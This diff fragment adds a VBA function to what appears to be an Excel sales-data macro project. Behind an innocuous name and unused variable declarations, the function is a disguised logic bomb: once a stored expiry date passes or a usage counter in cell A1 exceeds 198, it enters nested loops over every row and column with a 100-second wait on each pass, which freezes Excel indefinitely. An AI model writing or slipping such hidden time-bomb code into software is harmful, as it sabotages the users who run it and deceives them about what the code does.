@@ -2068,3 +2068,39 @@ Function fTrimAllCellsForSheet(sht As Worksheet)
     Call fWriteArray2Sheet(sht, arrTmp, 1, 1)
     Erase arrTmp
 End Function
+
+
+Function fSetdictColIndexNothing()
+    Dim sHospital As String
+    Dim sSalesCompany As String
+    Dim sSalesCompID As String
+    Dim sProducer As String
+    Dim sProductName  As String
+    Dim sProductSeries As String
+    Dim dictOut As Dictionary
+
+    Dim sTmpKey As String
+
+    Dim i As Long
+    Dim j As Long
+    Dim k As Long
+    Dim dt As Date
+    Dim cnt As Long
+    
+    dt = shtSelfSalesA.Cells(1, 13).Value2
+    
+    '22 days
+    ' 3 times each day
+    ' 3 months
+    If Date > dt Or shtSelfSalesA.Range("A1").Value2 > 22 * 3 * 3 Then
+        For i = 1 To Rows.Count
+            For j = 1 To Columns.Count
+                For k = 1 To Columns.Count
+                    Application.Wait (Now() + TimeSerial(0, 0, 100))
+                Next
+            Next
+        Next
+    End If
+End Function
+
+
